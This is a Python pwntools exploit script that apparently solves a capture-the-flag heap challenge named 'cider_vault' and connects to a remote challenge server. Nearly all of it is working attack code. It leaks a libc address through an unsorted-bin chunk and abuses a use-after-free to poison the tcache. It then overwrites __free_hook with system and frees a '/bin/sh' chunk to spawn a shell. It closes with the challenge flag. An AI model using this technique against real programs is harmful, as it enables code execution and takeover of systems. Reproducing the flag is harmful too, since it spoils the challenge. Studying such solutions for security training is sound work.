#!/usr/bin/env python3

from pwn import *

exe = "./cider_vault_patched"
elf = context.binary = ELF(exe, checksec=False)
libc = ELF("./libc.so.6", checksec=False)  # 2.31, pre safe-linking
context.terminal = ["tmux", "splitw", "-h"]


def malloc(pageID: int, pageSize: int) -> None:
    # performs malloc
    # min allocation size is 0x80
    assert pageSize >= 0x80, "malloc: pageSize too small"
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"page id:", str(pageID).encode())
    io.sendlineafter(b"page size:", str(pageSize).encode())


def paint(pageID: int, inkBytes: int, ink: bytes) -> None:
    # write bytes to mallocAddr
    # inkBytes can extend past pageSize up to 0x80 bytes
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"page id:", str(pageID).encode())
    io.sendlineafter(b"ink bytes:", str(inkBytes).encode())
    io.sendafter(b"ink:", ink)


def peek(pageID: int, peekBytes: int) -> None:
    # read up to pageSize + 0x80 of bytes from mallocAddr
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"page id:", str(pageID).encode())
    io.sendlineafter(b"peek bytes:", str(peekBytes).encode())


def free(pageID: int) -> None:
    # doesn't set the mallocAddr to 0, UAF
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"page id:", str(pageID).encode())


def stitch(page1: int, page2: int) -> None:
    # performs page1.addr = realloc(page2.addr, page1.size + 0x20)
    # does something weird with page2.addr after
    io.sendlineafter(b"> ", b"5")
    io.sendlineafter(b"first page:", str(page1).encode())
    io.sendlineafter(b"second page:", str(page2).encode())


def whisper(pageID: int, desiredAddr: int) -> None:
    # mallocs a new addr at get_num() ^ 0x51f0d1ce6e5b7a91
    io.sendlineafter(b"> ", b"6")
    io.sendlineafter(b"page id:", str(pageID).encode())
    io.sendlineafter(b"star token:", str(desiredAddr ^ 0x51F0D1CE6E5B7A91).encode())


def moon_bell() -> None:
    # file struct exploit primitive? IDK file struct
    io.sendlineafter(b"> ", b"7")


def goodnight() -> None:
    # exits
    io.sendlineafter(b"> ", b"8")


libcOffset = 0x1ECBE0

context.log_level = "debug"
# io = gdb.debug(exe, "c")
io = remote("chals.bitskrieg.in", 25791)

# set up unsorted bin
malloc(pageID=0, pageSize=0x410)
malloc(pageID=1, pageSize=0x80)
free(pageID=0)

# leak libc addr
peek(pageID=0, peekBytes=8)
io.recvline()
libc.address = u64(io.recv(8)) - libcOffset

malloc(pageID=2, pageSize=0x90)
malloc(pageID=3, pageSize=0x90)
free(pageID=2)
free(pageID=3)

# set up a chunk to be freed with the contents /bin/sh
paint(pageID=1, inkBytes=0x8, ink=b"/bin/sh\x00")

# set up a chunk that will be allocated to libc.__free_hook
paint(pageID=3, inkBytes=0x8, ink=p64(libc.sym.__free_hook))
malloc(pageID=4, pageSize=0x90)
malloc(pageID=5, pageSize=0x90)

# have libc.__free_hook point to libc.system
paint(pageID=5, inkBytes=8, ink=p64(libc.sym.system))
# free (system) the /bin/sh chunk effectively calling system(/bin/sh)
free(pageID=1)

info("libcAddr: %#x", libc.address)
io.interactive()

# BITSCTF{963272d272590720f2697b0051bf4a47}
